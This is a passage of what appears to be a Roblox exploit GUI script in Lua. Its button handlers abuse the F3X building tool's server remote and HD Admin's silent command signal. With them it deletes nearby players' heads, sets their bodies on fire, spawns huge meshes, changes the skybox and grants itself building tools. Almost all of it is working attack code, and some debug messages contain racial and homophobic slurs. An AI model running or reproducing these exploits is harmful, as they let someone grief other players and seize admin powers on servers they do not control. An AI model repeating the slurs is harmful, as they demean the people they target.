								MeshResize(v, Vector3.new(99999,99999,99999))
								SetCollision(v,false)
								SetLocked(v,true)
		
		
								SetVertexColor(v, Vector3.new(1,1,1))
		
		
								CreateSpotlight(v)
								SyncLighting(v,12)
							end
						end
					end
		
		
					Sky("111175582812575")
				end)
		
				--97518021379547
			end
			coroutine.wrap(DXCAEZU_fake_script)()
			
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_26);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_28()
	local script = G2L["28"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
		
			-- find shit
			local tool
			for _, v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
					break
				end
			end
			for _, v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
					break
				end
			end
			if not tool then
				warn("ไม่พบ SyncAPI Tool!")
				return
			end
		
			local remote = tool.SyncAPI.ServerEndpoint
		
		
			local head = char:FindFirstChild("Head")
			if not head then
				warn("fuck fagz")
				return
			end
			local headMesh = head:FindFirstChildWhichIsA("SpecialMesh")
			if not headMesh then
				warn("nigga")
				return
			end
		
		
			local hats = {}
			for _, hat in pairs(char:GetChildren()) do
				if hat:IsA("Accessory") and hat:FindFirstChild("Handle") then
					local handleMesh = hat.Handle:FindFirstChildWhichIsA("SpecialMesh")
					if handleMesh then
						table.insert(hats, {Part = hat.Handle, MeshId = handleMesh.MeshId})
					end
				end
			end
		
		
			local amplitude = 0.7
			local frequency = 6 
			local t = 0
		
			local RunService = game:GetService("RunService")
			RunService.RenderStepped:Connect(function(dt)
				t = t + dt * frequency
				local offsetValue = math.sin(t) * amplitude
		
		
				local partsToSync = {
					{Part = head, MeshId = headMesh.MeshId, Offset = Vector3.new(offsetValue, 0, 0)}
				}
				for _, h in pairs(hats) do
					table.insert(partsToSync, {Part = h.Part, MeshId = h.MeshId, Offset = Vector3.new(offsetValue, 0, 0)})
				end
		
				remote:InvokeServer("SyncMesh", partsToSync)
			end)
			
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_28);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_2a()
	local script = G2L["2a"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local humanoid = char:WaitForChild("Humanoid")
			local animation = Instance.new("Animation")
		
			animation.AnimationId = "rbxassetid://27432686"
		
			local animTrack1 = humanoid:LoadAnimation(animation)
			animTrack1.Priority = Enum.AnimationPriority.Idle
		
			animTrack1:Play()
			animTrack1:AdjustSpeed(0)
		
			local animation = Instance.new("Animation")
			animation.AnimationId = "rbxassetid://183695923"
		
			local animTrack = humanoid:LoadAnimation(animation)
			animTrack.Priority = Enum.AnimationPriority.Idle
			animTrack.Looped = true
		
			local walking = false
		
			humanoid.Running:Connect(function(speed)
				walking = speed > 1
		
				if walking and not animTrack.IsPlaying then
					animTrack:Play()
					animTrack1:Stop()
				end
		
				if not walking and animTrack.IsPlaying then
					animTrack:Stop()
					animTrack1:Play()
					animTrack1:AdjustSpeed(0)
				end
			end)
		
			spawn(function()
				while true do
					if walking then
						animTrack:AdjustSpeed(3)
						wait(0.3)
						animTrack:AdjustSpeed(-3)
						wait(0.3)
					else
						wait(0.1)
					end
				end
			end)
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_2a);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_2c()
	local script = G2L["2c"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
			local player = game.Players.LocalPlayer
			local originalChar = player.Character or player.CharacterAdded:Wait()
			local tool
			while player.Character == originalChar do
				for i, v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
		
				for i, v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
		
				local remote = tool.SyncAPI.ServerEndpoint
		
				function _(args)
					remote:InvokeServer(unpack(args))
				end
		
				function DestroyPart(part)
					spawn(function()
						local args = {
							[1] = "Remove",
							[2] = {
								[1] = part
							}
						}
						_(args)
					end)
				end
		
				function AddDecor(part, dec)
					spawn(function()
						local args = {
							[1] = "CreateDecorations",
							[2] = {
								[1] = {
									["Part"] = part,
									["DecorationType"] = dec
								}
							}
						}
						_(args)
					end)
				end
		
				function a()
					local dist = 17
					local distance = dist
					local Player = game.Players.LocalPlayer
		
					if Player then
						local c = game.Players:GetChildren()
						for i = 1, #c do
							if c[i].Name ~= Player.Name then
								if c[i].Character and c[i].Character:FindFirstChild("Head") then
									local char = c[i].Character
									local torso = game.Workspace[Player.Name]:FindFirstChild("Torso")
									if torso and c[i]:DistanceFromCharacter(torso.Position) <= distance then
										DestroyPart(char:FindFirstChild("Head"))
										for _, part in ipairs(char:GetChildren()) do
											if part:IsA("BasePart") then
												AddDecor(part, "Fire")
											end
										end
									end
								end
							end
						end
					end
				end
		
		
				spawn(a)
				wait()
			end
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_2c);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_2e()
	local script = G2L["2e"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
			local player = game.Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local humanrFr = char:WaitForChild("HumanoidRootPart")
			local tool
			for i,v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			for i,v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			remote = tool.SyncAPI.ServerEndpoint
			function _(args)
				remote:InvokeServer(unpack(args))
			end
			function SetCollision(part,boolean)
				local args = {
					[1] = "SyncCollision",
					[2] = {
						[1] = {
							["Part"] = part,
							["CanCollide"] = boolean
						}
					}
				}
				_(args)
			end
			function SetAnchor(boolean,part)
				local args = {
					[1] = "SyncAnchor",
					[2] = {
						[1] = {
							["Part"] = part,
							["Anchored"] = boolean
						}
					}
				}
				_(args)
			end
			function CreatePart(cf,parent)
				local args = {
					[1] = "CreatePart",
					[2] = "Normal",
					[3] = cf,
					[4] = parent
				}
				_(args)
			end
			function DestroyPart(part)
				local args = {
					[1] = "Remove",
					[2] = {
						[1] = part
					}
				}
				_(args)
			end
			function MovePart(part,cf)
				local args = {
					[1] = "SyncMove",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf
						}
					}
				}
				_(args)
			end
			function Resize(part,size,cf)
				local args = {
					[1] = "SyncResize",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf,
							["Size"] = size
						}
					}
				}
				_(args)
			end
			function AddMesh(part)
				local args = {
					[1] = "CreateMeshes",
					[2] = {
						[1] = {
							["Part"] = part
						}
					}
				}
				_(args)
			end
			function SetMesh(part,meshid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["MeshId"] = "rbxassetid://"..meshid
						}
					}
				}
				_(args)
			end
			function SetTexture(part, texid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["TextureId"] = "rbxassetid://"..texid
						}
					}
				}
				_(args)
			end
			function SetName(part, stringg)
				local args = {
					[1] = "SetName",
					[2] = {
						[1] = part
					},
					[3] = stringg
				}
				_(args)
			end
			function MeshResize(part,size)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["Scale"] = size
						}
					}
				}
				_(args)
			end
			function Weld(part1, part2,lead)
				local args = {
					[1] = "CreateWelds",
					[2] = {
						[1] = part1,
						[2] = part2
					},
					[3] = lead
				}
				_(args)
			end
			function SetLocked(part,boolean)
				local args = {
					[1] = "SetLocked",
					[2] = {
						[1] = part
					},
					[3] = boolean
				}
				_(args)
			end
			function SetTrans(part,int)
				local args = {
					[1] = "SyncMaterial",
					[2] = {
						[1] = {
							["Part"] = part,
							["Transparency"] = int
						}
					}
				}
				_(args)
			end
			function CreateSpotlight(part)
				local args = {
					[1] = "CreateLights",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "SpotLight"
						}
					}
				}
				_(args)
			end
			function SyncLighting(part,brightness)
				local args = {
					[1] = "SyncLighting",
					[2] = {
						[1] = {
							["Part"] = part,
							["LightType"] = "SpotLight",
							["Brightness"] = brightness
						}
					}
				}
				_(args)
			end
			function Color(part,color)
				local args = {
					[1] = "SyncColor",
					[2] = {
						[1] = {
							["Part"] = part,
							["Color"] = color,
							["UnionColoring"] = false
						}
					}
				}
				_(args)
			end
			function SpawnDecal(part,side)
				local args = {
					[1] = "CreateTextures",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = side,
							["TextureType"] = "Decal"
						}
					}
				}
				_(args)
			end
			function AddDecal(part,asset,side)
				local args = {
					[1] = "SyncTexture",
					[2] = {
						[1] = {
							["Part"] = part,
							["Face"] = side,
							["TextureType"] = "Decal",
							["Texture"] = "rbxassetid://".. asset
						}
					}
				}
				_(args)
			end
			local cf = humanrFr.CFrame * CFrame.new(0, -4, 0)
			local pad = remote:InvokeServer("CreatePart", "Normal", cf, workspace)
			Resize(pad, Vector3.new(40, 1, 40), cf)
			SetAnchor(true, pad)
			SetCollision(pad, true)
			SetName(pad, "padF")
			AddMesh(pad)
			SetMesh(pad, 9095618661)
			MeshResize(pad, Vector3.new(4.5, 0.5, 4.5))
			Color(pad, BrickColor.new(104).Color)
			game:GetService("RunService").RenderStepped:Connect(function()
				if pad and humanrFr then
					local newCF = humanrFr.CFrame * CFrame.new(0, -4, 0)
					MovePart(pad, newCF)
				end
			end)
			
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_2e);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_30()
	local script = G2L["30"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
			local player = game.Players.LocalPlayer
			local char = player.Character
			local tool
			for i,v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			for i,v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			--craaa
			remote = tool.SyncAPI.ServerEndpoint
			function _(args)
				remote:InvokeServer(unpack(args))
			end
			function a()
				presets = {"Bright red","Bright yellow","Bright orange","Bright violet","Bright blue","Bright bluish green","Bright green"}
				spawn(function()
					local args = {
						[1] = "SyncColor",
						[2] = {
							[1] = {
								["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
								["Part"] = game:GetService("Players").LocalPlayer.Character.Head,
								["UnionColoring"] = true
							},
							[2] = {
								["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
								["Part"] = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart,
								["UnionColoring"] = true
							},
							[3] = {
								["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
								["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Left Arm"),
								["UnionColoring"] = true
							},
							[4] = {
								["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
								["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Right Leg"),
								["UnionColoring"] = true
							},
							[5] = {
								["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
								["Part"] = game:GetService("Players").LocalPlayer.Character.Torso,
								["UnionColoring"] = true
							},
							[6] = {
								["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
								["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Right Arm"),
								["UnionColoring"] = true
							},
							[7] = {
								["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
								["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Left Leg"),
								["UnionColoring"] = true
							}
						}
					}
		
					_(args)
				end)
			end
		
			local warned = false
		
			local meshTypes = {
				Enum.MeshType.Brick,
				Enum.MeshType.Cylinder,
				Enum.MeshType.Head,
				Enum.MeshType.Sphere,
				Enum.MeshType.Wedge
			}
		
			local function getBuildingTool(player)
				for _, container in ipairs({player.Character, player.Backpack}) do
					if container then
						for _, item in ipairs(container:GetChildren()) do
							if item:IsA("Tool") and item:FindFirstChild("SyncAPI") then
								return item
							end
						end
					end
				end
				return nil
			end
		
			local function removemesh(part)
				for _, child in ipairs(part:GetChildren()) do
					if child:IsA("MeshPart") or child:IsA("SpecialMesh") then
						local args = {"Remove", { child }}
						local tool = getBuildingTool(game.Players.LocalPlayer)
						if tool then
							tool.SyncAPI.ServerEndpoint:InvokeServer(unpack(args))
						elseif not warned then
							warn("Building tool not found")
							warned = true
						end
					end
				end
			end
		
			local function applymesh(part)
				removemesh(part)
		
				local randomMeshType = meshTypes[math.random(1, #meshTypes)]
				local argsCreate = {"CreateMeshes", {{ Part = part }}}
				local argsSync   = {"SyncMesh",     {{ MeshType = randomMeshType, Part = part }}}
		
				local tool = getBuildingTool(game.Players.LocalPlayer)
				if tool then
					tool.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsCreate))
					tool.SyncAPI.ServerEndpoint:InvokeServer(unpack(argsSync))
				elseif not warned then
					warn("Building tool not found")
					warned = true
				end
			end
		
			local player = game:GetService("Players").LocalPlayer
		
			local function randomizeCharacterMeshes(character)
				for _, obj in ipairs(character:GetDescendants()) do
					if (obj:IsA("Part") or obj:IsA("MeshPart")) then
						applymesh(obj)
					end
				end
			end
		
			while true do
				if player.Character then
					randomizeCharacterMeshes(player.Character)
				end
				wait() 
				spawn(function()
					a()
				end)
			end
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_30);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_33()
	local script = G2L["33"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
			RequestCommand:InvokeServer(";re ;r6")
		
			
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_33);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_35()
	local script = G2L["35"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
			local ReplicatedStorage = game:GetService("ReplicatedStorage")
			local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
			RequestCommand:InvokeServer(";btools ;give me b")
		
			
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_35);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_37()
	local script = G2L["37"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
			local Players = game:GetService("Players")
			local RunService = game:GetService("RunService")
		
			local player = Players.LocalPlayer
			local character = player.Character or player.CharacterAdded:Wait()
		
		
			local tool
			for _, obj in ipairs(player:GetDescendants()) do
				if obj.Name == "SyncAPI" then
					tool = obj.Parent
				end
			end
			for _, obj in ipairs(game.ReplicatedStorage:GetDescendants()) do
				if obj.Name == "SyncAPI" then
					tool = obj.Parent
				end
			end
		
			if not tool then
				warn("bro what")
				return
			end
		
			local SyncAPI = tool.SyncAPI
			local part
		
		
			local baseOffsetY = -4.5
			local currentOffsetY = baseOffsetY
			local lowerAmount = -0.8
			local timer = 0
			local lowerInterval = 1
			local velocityThreshold = 2
		
		
			local colorTimer = 0
			local colorInterval = 0.049 
			local hue = 0
			local hueSpeed = 0.6
			local brightness = 1
			local brightDir = -1
		
		
			local function _(args)
				SyncAPI:Invoke(unpack(args))
			end
		
		
			local function CreatePart(cf, parent)
				_( {"CreatePart","Normal",cf,parent} )
			end
		
			local function SetAnchor(p, anchored)
				_( {"SyncAnchor",{{Part=p,Anchored=anchored}}} )
			end
		
			local function AddMesh(p)
				_( {"CreateMeshes",{{Part=p}}} )
			end
		
			local function SetMesh(p, meshId)
				_( {"SyncMesh",{{Part=p,MeshId="rbxassetid://" .. meshId}}} )
			end
		
			local function ResizeMesh(p, size)
				_( {"SyncMesh",{{Part=p,Scale=size}}} )
			end
		
			local function SyncColor(p, color)
				_( {"SyncColor",{{Part=p,Color=color}}} )
			end
		
			local function SetTransparency(p, value)
				_( {"SyncTransparency",{{Part=p,Transparency=value}}} )
			end
		
			local function SyncRotate(cf)
				if not part or not part.Parent then return end
				_( {"SyncRotate",{{Part=part,CFrame=cf}}} )
			end
		
		
			local function Platform()
				local hrp = character:WaitForChild("HumanoidRootPart")
				local humanoid = character:WaitForChild("Humanoid")
		
				local startCF = hrp.CFrame + Vector3.new(0, baseOffsetY, 0)
				CreatePart(startCF, workspace)
		
				for _, obj in ipairs(workspace:GetDescendants()) do
					if obj:IsA("BasePart") and (obj.Position - startCF.Position).Magnitude < 0.1 then
						part = obj
						part.Name = "Floating"
		
						SetAnchor(part, true)
						AddMesh(part)
						SetMesh(part, "9095618661") 
						ResizeMesh(part, Vector3.new(5, 0.5, 5))
						SetTransparency(part, 0.1)
		
						local connection
						connection = RunService.Heartbeat:Connect(function(dt)
							if not part or not part.Parent then
								if connection then connection:Disconnect() end
								return
							end
		
		
							local isInAir = (humanoid.FloorMaterial == Enum.Material.Air)
							local isStopped = (hrp.Velocity.Magnitude < velocityThreshold)
		
							if isInAir and isStopped then
								timer += dt
								if timer >= lowerInterval then
									timer = 0
									currentOffsetY += lowerAmount
								end
							else
								timer = 0
								currentOffsetY = baseOffsetY
							end
		
							local cf = hrp.CFrame * CFrame.new(0, currentOffsetY, 0)
							SyncRotate(cf)
							part.CFrame = cf
		
		
							colorTimer += dt
							if colorTimer >= colorInterval then
								colorTimer = 0
		
								hue += hueSpeed * dt
								if hue > 1 then hue -= 1 end
		
								brightness += brightDir * dt
								if brightness <= 0.4 then
									brightness = 0.4
									brightDir = 1
								elseif brightness >= 1 then
									brightness = 1
									brightDir = -1
								end
		
								local rainbow = Color3.fromHSV(hue, 1, brightness)
								SyncColor(part, rainbow)
							end
						end)
						break
					end
				end
			end
		
			Platform()
		
			local Players = game:GetService("Players")
			local RunService = game:GetService("RunService")
			local player = Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local tool
			for _,v in player:GetDescendants() do if v.Name == "SyncAPI" then tool = v.Parent end end
			for _,v in game.ReplicatedStorage:GetDescendants() do if v.Name == "SyncAPI" then tool = v.Parent end end
			local remote = tool.SyncAPI.ServerEndpoint
			local function _(args) remote:InvokeServer(unpack(args)) end
		
			function CreatePart(cf,parent) _( {"CreatePart","Normal",cf,parent} ) end
			function SetAnchor(b,p) _( {"SyncAnchor",{{Part=p,Anchored=b}}} ) end
			function SetCollision(p,b) _( {"SyncCollision",{{Part=p,CanCollide=b}}} ) end
			function Resize(p,s,cf) _( {"SyncResize",{{Part=p,Size=s,CFrame=cf}}} ) end
			function MovePart(p,cf) _( {"SyncMove",{{Part=p,CFrame=cf}}} ) end
			function SetTransparency(p,t) _( {"SyncMaterial",{{Part=p,Transparency=t}}} ) end
			function DestroyPart(p) _( {"Remove",{p}} ) end
		
			local platform
			local baseOffsetY = -4.5        
			local currentOffsetY = baseOffsetY
			local lowerAmount = -0.8     
			local timer = 0
			local lowerInterval = 1         
			local velocityThreshold = 2
		
			local function CreateInvisiblePlatform()
				local hrp = char:WaitForChild("HumanoidRootPart")
				local humanoid = char:WaitForChild("Humanoid")
				local startCF = hrp.CFrame * CFrame.new(0, baseOffsetY, 0)
		
				CreatePart(startCF, workspace)
				task.wait(0.5)
		
				for _,v in workspace:GetChildren() do
					if v:IsA("BasePart") and (v.Position - startCF.Position).Magnitude < 5 then
						platform = v
						SetAnchor(true, platform)
						SetCollision(platform, true) 
						Resize(platform, Vector3.new(16, 1, 16), platform.CFrame)  
						SetTransparency(platform, 1) 
						break
					end
				end
			end
		
		
			RunService.Heartbeat:Connect(function(dt)
				if not platform or not platform.Parent then return end
		
				local hrp = char:FindFirstChild("HumanoidRootPart")
				local humanoid = char:FindFirstChild("Humanoid")
				if not hrp or not humanoid then return end
		
				local isInAir = (humanoid.FloorMaterial == Enum.Material.Air)
				local isStopped = (hrp.Velocity.Magnitude < velocityThreshold)
		
				if isInAir and isStopped then
					timer = timer + dt
					if timer >= lowerInterval then
						timer = 0
						currentOffsetY = currentOffsetY + lowerAmount 
					end
				else
					timer = 0
					currentOffsetY = baseOffsetY 
				end
		
				local targetCF = hrp.CFrame * CFrame.new(0, currentOffsetY, 0)
				MovePart(platform, targetCF)
			end)
		
		
			CreateInvisiblePlatform()
		
		
			player.CharacterAdded:Connect(function(newChar)
				char = newChar
				if platform then DestroyPart(platform) end
				timer = 0
				currentOffsetY = baseOffsetY
				task.wait(3)
				CreateInvisiblePlatform()
			end)
		
		
		
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_37);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_39()
	local script = G2L["39"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
			local player = game.Players.LocalPlayer
			local char = player.Character
			local tool
			for i,v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			for i,v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			--craaa
			remote = tool.SyncAPI.ServerEndpoint
			function _(args)
				remote:InvokeServer(unpack(args))
			end
			function a()
				presets = {"Bright red","Bright yellow","Bright orange","Bright violet","Bright blue","Bright bluish green","Bright green"}
				spawn(function()
					local args = {
						[1] = "SyncColor",
						[2] = {
							[1] = {
								["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
								["Part"] = game:GetService("Players").LocalPlayer.Character.Head,
								["UnionColoring"] = true
							},
							[2] = {
								["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
								["Part"] = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart,
								["UnionColoring"] = true
							},
							[3] = {
								["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
								["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Left Arm"),
								["UnionColoring"] = true
							},
							[4] = {
								["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
								["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Right Leg"),
								["UnionColoring"] = true
							},
							[5] = {
								["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
								["Part"] = game:GetService("Players").LocalPlayer.Character.Torso,
								["UnionColoring"] = true
							},
							[6] = {
								["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
								["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Right Arm"),
								["UnionColoring"] = true
							},
							[7] = {
								["Color"] = BrickColor.new(presets[math.random(1,#presets)]).Color,
								["Part"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Left Leg"),
								["UnionColoring"] = true
							}
						}
					}
		
					_(args)
				end)
			end
		
			while true do
				wait()
				spawn(function()
					a()
				end)
			end
			
			
			
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_39);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_3b()
	local script = G2L["3b"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
			local Players = game:GetService("Players")
			local RunService = game:GetService("RunService")
		
			local player = Players.LocalPlayer
			local char = player.Character or player.CharacterAdded:Wait()
			local hrp = char:WaitForChild("HumanoidRootPart")
		
			-- หา SyncAPI
			local tool
			for _,v in ipairs(player:GetDescendants()) do
				if v.Name == "SyncAPI" then tool = v.Parent end
			end
			for _,v in ipairs(game.ReplicatedStorage:GetDescendants()) do
				if v.Name == "SyncAPI" then tool = v.Parent end
			end
			if not tool then return warn("ไม่พบ SyncAPI") end
		
			local remote = tool.SyncAPI.ServerEndpoint
			local function _(args)
				remote:InvokeServer(unpack(args))
			end
		
			-- ฟังก์ชัน SyncAPI
			function SetCollision(part,boolean)
				_( {"SyncCollision",{ {Part=part,CanCollide=boolean} } } )
			end
			function SetAnchor(boolean,part)
				_( {"SyncAnchor",{ {Part=part,Anchored=boolean} } } )
			end
			function CreatePart(cf,parent)
				_( {"CreatePart","Normal",cf,parent} )
			end
			function MovePart(part,cf)
				_( {"SyncMove",{ {Part=part,CFrame=cf} } } )
			end
			function AddMesh(part)
				_( {"CreateMeshes",{ {Part=part} } } )
			end
			function SetMesh(part,meshid)
				_( {"SyncMesh",{ {Part=part, MeshId="rbxassetid://"..meshid} } } )
			end
			function MeshResize(part,size)
				_( {"SyncMesh",{ {Part=part, Scale=size} } } )
			end
			function SetName(part,stringg)
				_( {"SetName",{part},stringg} )
			end
			function Color(part,color)
				_( {"SyncColor",{ {Part=part,Color=color,UnionColoring=false} } } )
			end
		
			-- ฟังก์ชันรอ Part
			local function waitForPart(pos)
				local part
				for i=1,50 do
					for _,v in ipairs(workspace:GetDescendants()) do
						if v:IsA("BasePart") and (v.Position - pos).Magnitude < 1 then
							part = v
							return part
						end
					end
					task.wait(0.05)
				end
				return part
			end
		
			-- สร้าง Mesh รอบผู้เล่น ขนาด 2x2x2
			local function createOrbitMesh()
				local radius = 5
				local speed = math.rad(45)
				local angle = 0
		
				local cf = hrp.CFrame * CFrame.new(radius,0,0)
				CreatePart(cf, workspace)
				task.wait(0.2)
		
				local meshPart = waitForPart(cf.Position)
				if not meshPart then return warn("ไม่พบ Part") end
		
				SetName(meshPart,"OrbitMesh")
				SetAnchor(true, meshPart)
				SetCollision(meshPart,false)
				AddMesh(meshPart)
				SetMesh(meshPart,"73293113466593")
				MeshResize(meshPart, Vector3.new(2,2,2)) -- ขนาด 2x2x2
				Color(meshPart, Color3.fromRGB(0,255,0))
		
				RunService.Heartbeat:Connect(function(dt)
					angle = angle + dt*speed
					local x = math.cos(angle)*radius
					local z = math.sin(angle)*radius
					local pos = hrp.Position + Vector3.new(x,0,z)
					local cfNew = CFrame.new(pos) * CFrame.Angles(0, angle, 0)
					MovePart(meshPart, cfNew)
				end)
			end
		
			createOrbitMesh()
			
		
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
			
		end)
		
	end;
	task.spawn(C_3b);
	-- StarterGui.page2 .Frame.ScrollingFrame.TextButton.LocalScript
	local function C_3d()
	local script = G2L["3d"];
		script.Parent.MouseButton1Click:Connect(function()
			
			
			
			local player = game.Players.LocalPlayer
			local char = player.Character
			local tool
			for i,v in player:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			for i,v in game.ReplicatedStorage:GetDescendants() do
				if v.Name == "SyncAPI" then
					tool = v.Parent
				end
			end
			remote = tool.SyncAPI.ServerEndpoint
			function _(args)
				remote:InvokeServer(unpack(args))
			end
			function SetCollision(part,boolean)
				local args = {
					[1] = "SyncCollision",
					[2] = {
						[1] = {
							["Part"] = part,
							["CanCollide"] = boolean
						}
					}
				}
				_(args)
			end
			function SetAnchor(boolean,part)
				local args = {
					[1] = "SyncAnchor",
					[2] = {
						[1] = {
							["Part"] = part,
							["Anchored"] = boolean
						}
					}
				}
				_(args)
			end
			function CreatePart(cf,parent)
				local args = {
					[1] = "CreatePart",
					[2] = "Normal",
					[3] = cf,
					[4] = parent
				}
				_(args)
			end
			function DestroyPart(part)
				local args = {
					[1] = "Remove",
					[2] = {
						[1] = part
					}
				}
				_(args)
			end
			function MovePart(part,cf)
				local args = {
					[1] = "SyncMove",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf
						}
					}
				}
				_(args)
			end
			function Resize(part,size,cf)
				local args = {
					[1] = "SyncResize",
					[2] = {
						[1] = {
							["Part"] = part,
							["CFrame"] = cf,
							["Size"] = size
						}
					}
				}
				_(args)
			end
			function AddMesh(part)
				local args = {
					[1] = "CreateMeshes",
					[2] = {
						[1] = {
							["Part"] = part
						}
					}
				}
				_(args)
			end
		
			function SetMesh(part,meshid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["MeshId"] = "rbxassetid://"..meshid
						}
					}
				}
				_(args)
			end
			function SetTexture(part, texid)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["TextureId"] = "rbxassetid://"..texid
						}
					}
				}
				_(args)
			end
			function SetName(part, stringg)
				local args = {
					[1] = "SetName",
					[2] = {
						[1] = workspace.Part
					},
					[3] = stringg
				}
		
				_(args)
			end
			function MeshResize(part,size)
				local args = {
					[1] = "SyncMesh",
					[2] = {
						[1] = {
							["Part"] = part,
							["Scale"] = size
						}
					}
				}
				_(args)
			end
			function Weld(part1, part2,lead)
				local args = {
					[1] = "CreateWelds",
					[2] = {
						[1] = part1,
						[2] = part2
					},
					[3] = lead
				}
				_(args)
		
			end
			function SetLocked(part,boolean)
				local args = {
					[1] = "SetLocked",
					[2] = {
						[1] = part
					},
					[3] = boolean
				}
				_(args)
			end
			function SetTrans(part,int)
				local args = {
					[1] = "SyncMaterial",
					[2] = {
						[1] = {
							["Part"] = part,
							["Transparency"] = int
						}
					}
				}
				_(args)
			end
